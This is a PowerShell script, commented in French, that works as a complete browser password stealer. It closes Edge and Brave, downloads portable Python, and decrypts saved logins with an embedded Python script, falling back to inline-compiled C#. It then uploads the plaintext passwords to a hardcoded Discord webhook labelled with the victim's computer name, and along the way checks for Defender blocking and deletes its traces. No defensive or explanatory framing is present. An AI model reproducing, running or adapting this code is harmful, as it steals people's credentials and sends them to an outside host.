$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"

taskkill /F /IM msedge.exe,brave.exe 2>$null
Start-Sleep 2

try {
    # Télécharger Python portable (version embed)
    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30 -EA Stop
    
    # Vérifier que ce n'est pas un fichier bloqué par Defender
    $pySize = (Get-Item "$env:TEMP\py.zip").Length
    
    if ($pySize -lt 100000) {
        # Trop petit = bloqué, essayer alternative
        throw "Python download blocked"
    }
    
    Expand-Archive "$env:TEMP\py.zip" "$env:TEMP\py" -Force
    
    # Configurer pip
    $pthFile = Get-Content "$env:TEMP\py\python311._pth"
    $pthFile = $pthFile -replace '#import site', 'import site'
    $pthFile | Out-File "$env:TEMP\py\python311._pth" -Encoding ascii
    
    # Télécharger get-pip
    Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$env:TEMP\py\get-pip.py" -UseBasicParsing -TimeoutSec 20
    
    cd "$env:TEMP\py"
    
    # Installer pip
    .\python.exe get-pip.py --no-warn-script-location 2>$null
    
    # Installer modules
    .\python.exe -m pip install pycryptodome pypiwin32 --no-warn-script-location --quiet 2>$null
    
    # Script d'extraction ultra-compact
    $pyScript = @'
import os,json,base64,sqlite3,shutil
try:
    import win32crypt
    from Crypto.Cipher import AES
except:
    exit(1)

def dec(db,st,n):
    try:
        with open(st) as f:
            k=win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
        shutil.copy2(db,"t.db")
        c=sqlite3.connect("t.db")
        r=[]
        for row in c.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"):
            try:
                a=AES.new(k,AES.MODE_GCM,nonce=row[2][3:15])
                p=a.decrypt_and_verify(row[2][15:-16],row[2][-16:]).decode()
                r.append(f"[{n}] {row[0]}\nUsername: {row[1]}\nPassword: {p}\n")
            except:
                pass
        c.close()
        os.remove("t.db")
        return r
    except:
        return []

res=[]
e=os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
if os.path.exists(e+r"\Default\Login Data"):
    res+=dec(e+r"\Default\Login Data",e+r"\Local State","EDGE")

b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
if os.path.exists(b+r"\Default\Login Data"):
    res+=dec(b+r"\Default\Login Data",b+r"\Local State","BRAVE")

if res:
    with open("passwords.txt","w",encoding="utf-8") as f:
        f.write(f"TOTAL PASSWORDS: {len(res)}\n{'='*60}\n\n")
        f.write("\n".join(res))
    print("SUCCESS")
else:
    print("NONE")
'@
    
    $pyScript | Out-File "extract.py" -Encoding UTF8
    
    # Exécuter
    $result = .\python.exe extract.py 2>$null
    
    if ($result -eq "SUCCESS" -and (Test-Path "passwords.txt")) {
        curl.exe -F "file=@passwords.txt" -F "content=**🔓 Python Portable SUCCESS - $env:COMPUTERNAME**" $wh 2>$null
        Remove-Item "passwords.txt" -Force
    } else {
        curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"⚠️ Python method executed but no passwords found - $env:COMPUTERNAME`"}" $wh 2>$null
    }
    
    # Cleanup
    cd $env:TEMP
    Remove-Item "py","py.zip" -Recurse -Force -EA 0
    
} catch {
    # Si Python est bloqué, utiliser la méthode BASE64 embedded
    
    curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"⚠️ Python download failed, trying embedded C# method... - $env:COMPUTERNAME`"}" $wh 2>$null
    
    # Méthode C# compilée à la volée (ne nécessite rien)
    $csharpCode = @'
using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Data.SQLite;
using Newtonsoft.Json.Linq;

public class EdgeDecryptor {
    public static void Main() {
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string edgePath = Path.Combine(localAppData, @"Microsoft\Edge\User Data");
        string loginData = Path.Combine(edgePath, @"Default\Login Data");
        string localState = Path.Combine(edgePath, "Local State");
        
        if (!File.Exists(loginData)) {
            Console.WriteLine("NONE");
            return;
        }
        
        // Lire la clé
        var state = JObject.Parse(File.ReadAllText(localState));
        byte[] encKey = Convert.FromBase64String(state["os_crypt"]["encrypted_key"].ToString());
        byte[] key = ProtectedData.Unprotect(encKey.Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        
        // Copier DB
        File.Copy(loginData, "temp.db", true);
        
        using (var conn = new SQLiteConnection("Data Source=temp.db")) {
            conn.Open();
            var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''", conn);
            var reader = cmd.ExecuteReader();
            
            var sb = new StringBuilder();
            int count = 0;
            
            while (reader.Read()) {
                byte[] encPass = (byte[])reader["password_value"];
                try {
                    byte[] nonce = encPass.Skip(3).Take(12).ToArray();
                    byte[] cipher = encPass.Skip(15).Take(encPass.Length - 31).ToArray();
                    byte[] tag = encPass.Skip(encPass.Length - 16).ToArray();
                    
                    var aes = new AesGcm(key);
                    byte[] plain = new byte[cipher.Length];
                    aes.Decrypt(nonce, cipher, tag, plain);
                    
                    sb.AppendLine($"[EDGE] {reader["origin_url"]}");
                    sb.AppendLine($"Username: {reader["username_value"]}");
                    sb.AppendLine($"Password: {Encoding.UTF8.GetString(plain)}");
                    sb.AppendLine();
                    count++;
                } catch { }
            }
            
            if (count > 0) {
                File.WriteAllText("passwords.txt", $"TOTAL: {count}\n\n{sb}");
                Console.WriteLine("SUCCESS");
            } else {
                Console.WriteLine("NONE");
            }
        }
        
        File.Delete("temp.db");
    }
}
'@
    
    # Compiler C# (nécessite .NET Framework qui est natif sur Windows)
    Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies @(
        "System.Security",
        "System.Data.SQLite"
    ) -EA 0
    
    # Note: Cette méthode nécessite System.Data.SQLite.dll qui n'est pas toujours disponible
    # Si elle échoue, on revient à la méthode brute
    
    curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"❌ All automated methods failed. Manual extraction required - $env:COMPUTERNAME`"}" $wh 2>$null
}
